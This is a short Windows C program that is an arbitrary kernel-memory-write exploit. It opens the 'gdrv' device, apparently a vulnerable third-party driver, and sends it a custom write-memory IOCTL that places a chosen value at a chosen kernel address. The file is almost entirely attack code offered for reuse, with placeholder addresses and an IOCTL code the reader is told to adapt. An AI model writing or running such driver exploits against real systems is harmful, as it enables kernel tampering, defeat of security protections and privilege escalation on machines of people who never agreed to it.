#include <windows.h>
#include <stdio.h>

#define IOCTL_WRITE_MEM 0x222003  // Replace with your vulnerable driver's IOCTL code

// Structure for communicating with the vulnerable driver
typedef struct _WRITE_MEM_REQUEST {
    PVOID TargetAddress;  // Kernel memory address to write to
    ULONG ValueToWrite;   // Value to write at the target address
} WRITE_MEM_REQUEST;
// all credits go to ME if you use this please credit the original creator :0

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\gdrv", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device\n");
        return 1;
    }

    // Target kernel address (modify based on target)
    PVOID targetAddress = (PVOID)0xFFFFF78000000380;  // Example address (DISCLAIMER: CHANGE BASED ON YOUR SYSTEM!!!)
    ULONG payload = 0x1337BEEF;  // Payload to write at the address

    WRITE_MEM_REQUEST request;
    request.TargetAddress = targetAddress;
    request.ValueToWrite = payload;

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,                      // Handle to the driver
        IOCTL_WRITE_MEM,              // IOCTL code for writing memory
        &request,                     // Request structure
        sizeof(WRITE_MEM_REQUEST),    // Size of the request
        NULL,                          // Output buffer (not needed)
        0,                             // Output buffer size (not needed)
        &bytesReturned,               // Number of bytes returned
        NULL                           // Overlapped (not used)
    );

    if (result) {
        printf("[+] Successfully wrote to kernel memory!\n");
    } else {
        printf("[-] Failed to write to kernel memory\n");
    }

    CloseHandle(hDevice);
    return 0;
}
